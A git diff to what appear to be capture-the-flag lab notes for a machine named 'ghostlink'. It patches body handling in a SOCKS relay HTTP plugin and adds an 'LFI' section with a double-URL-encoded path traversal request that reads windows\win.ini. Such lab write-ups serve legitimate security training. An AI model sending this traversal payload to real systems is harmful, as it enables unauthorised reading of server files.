@@ -623,6 +623,48 @@ configuring burp to tunnel through the proxy and test the enpoints
 
 fix the bug
 
+```
+nano /home/kali/machines/ghostlink/tools/ad/ghostsurf/lib/relay/servers/socksplugins/http.py
+```
+
+
+
+Find this block in `prepareRequest()`:
+
+python
+
+```python
+        # Append the body
+        response.append(b'')
+        body_parts = data.split(EOL+EOL)
+        if len(body_parts) > 1:
+            response.append(body_parts[1])
+        else:
+            response.append(b'')  # No body for GET requests
+        senddata = EOL.join(response)
+```
+
+Replace it with:
+
+python
+
+```python
+        # Append the body
+        response.append(b'')
+        headerEnd = data.find(EOL+EOL)
+        if headerEnd != -1:
+            body = data[headerEnd+4:]
+        else:
+            body = b''
+        response.append(body)
+        senddata = EOL.join(response)
+```
+
+## LFI
+
+```
+GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569 HTTP/1.1
+```
 
 ---
 ## Foothold
@@ -640,6 +682,8 @@ Step-by-step exploitation with commands.
 ```shell
 # Commands used
 ```
+
+lfi
 
 ---
 ## User Flag
